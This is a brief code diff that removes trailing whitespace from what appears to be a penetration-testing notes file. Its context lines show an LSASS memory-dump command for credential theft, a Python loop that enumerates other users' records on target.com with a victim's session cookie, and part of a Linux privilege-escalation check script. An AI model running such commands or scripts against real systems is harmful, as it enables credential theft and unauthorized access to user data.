@@ -184,7 +184,7 @@ procdump.exe -ma lsass.exe lsass.dmp
 import requests
 
 for user_id in range(1, 1000):
-    r = requests.get(f"https://target.com/api/users/{user_id}", 
+    r = requests.get(f"https://target.com/api/users/{user_id}",
                      cookies={"session": "victim_session"})
     if r.status_code == 200:
         print(f"Accessible: User {user_id}")
@@ -267,7 +267,7 @@ def check_sudo():
 def check_cron():
     cron_files = ["/etc/crontab"]
     cron_files.extend(
-        [f"/etc/cron.d/{f}" for f in os.listdir("/etc/cron.d")] 
+        [f"/etc/cron.d/{f}" for f in os.listdir("/etc/cron.d")]
         if os.path.exists("/etc/cron.d") else []
     )
     return cron_files
